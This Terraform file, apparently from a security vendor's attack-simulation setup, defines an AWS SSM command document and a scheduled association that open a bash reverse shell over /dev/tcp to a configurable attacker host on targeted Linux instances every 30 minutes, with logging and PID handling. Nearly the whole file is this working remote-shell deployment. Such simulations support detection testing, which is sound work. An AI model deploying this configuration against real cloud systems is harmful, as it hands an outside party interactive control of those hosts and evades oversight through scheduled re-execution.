locals {
    pid_path = "/var/run/nc_target"
    host_ip = var.host_ip
    host_port = var.host_port
}

resource "aws_ssm_document" "exec_reverse_shell_target" {
  name          = "exec_reverse_shell_target"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec reverse shell target",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_reverse_shell_target",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "echo \"Attacker Host: ${local.host_ip}:${local.host_port}\" > /tmp/attacker_exec_reverseshell_target.log",
                        "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
                        "echo \"sleeping\" >> /tmp/attacker_exec_reverseshell_target.log",
                        "sleep 10",
                        # "while ! nc -w 1 ${local.host_ip} ${local.host_port}; do echo \"waiting for port...\" >> /tmp/attacker_exec_reverseshell_target.log; sleep 5; done",
                        "echo \"Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1' &\" >> /tmp/attacker_exec_reverseshell_target.log",
                        "/bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1' &",
                        "echo -n $! > ${local.pid_path}",
                        "echo \"Reverse Shell Connected...\" >> /tmp/attacker_exec_reverseshell_target.log",
                        "touch /tmp/attacker_exec_reverseshell_target",
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_reverse_shell_target" {
    name = "exec_reverse_shell_target"

    resource_query {
        query = jsonencode(var.resource_query_exec_reverse_shell_target)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_reverse_shell_target" {
    association_name = "exec_reverse_shell_target"

    name = aws_ssm_document.exec_reverse_shell_target.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_reverse_shell_target.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}